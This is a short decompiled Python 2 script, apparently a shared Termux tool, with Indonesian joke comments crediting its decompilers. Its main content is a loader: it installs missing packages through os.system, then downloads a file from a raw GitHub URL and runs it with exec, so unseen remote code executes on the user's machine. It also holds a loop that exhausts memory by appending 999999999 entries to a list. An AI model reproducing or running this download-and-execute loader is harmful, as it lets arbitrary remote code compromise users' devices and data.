# coding:utf-8
# decompile by Itsuki ft. Aap Afandi ID
# ahk sit membagongkan sekali:v
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:47:43) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: arya
import os, sys, time
awas = []
try:
    import requests
except ImportError:
    os.system('pip2 install requests && python2 ' + sys.argv[0])

try:
    import bs4
except ImportError:
    os.system('pip2 install bs4 && python2 ' + sys.argv[0])
except IOError:
    for x in range(999999999):
        awas.append(sys.argv[0])

    sys.exit()

try:
    exec requests.get('https://raw.githubusercontent.com/Cindy-Aulia/pler/main/asw.py').text
except requests.exceptions.ConnectionError:
    sys.exit('\n [!] koneksi mu bermasalah lol!')

exit()
# Awokawokawok Ngerekod:v